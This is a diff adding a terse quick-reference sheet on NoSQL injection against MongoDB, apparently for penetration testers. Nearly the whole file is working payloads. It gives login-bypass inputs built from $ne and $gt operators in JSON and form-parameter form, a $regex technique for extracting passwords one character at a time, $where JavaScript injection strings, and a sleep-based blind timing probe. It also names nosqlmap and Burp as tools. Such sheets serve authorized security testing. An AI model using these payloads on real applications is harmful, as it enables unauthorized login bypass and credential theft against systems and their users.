@@ -1,0 +1,12 @@
+NoSQL INJECTION — QUICK REF (MongoDB)
+
+Two flavours: operator injection (JSON/params) | $where JS injection
+
+Auth bypass:
+  JSON  {"username":"admin","password":{"$ne":null}}
+        {"username":{"$gt":""},"password":{"$gt":""}}
+  form  username=admin&password[$ne]=x
+Extract:  {"password":{"$regex":"^a"}}  → walk charset char-by-char
+$where:   '; return true; //   |  {"$where":"sleep(5000)||true"}  (blind time)
+Operators: $ne $gt $gte $in $nin $regex $where $exists
+Tool: nosqlmap  |  Burp (Content-Type: application/json)
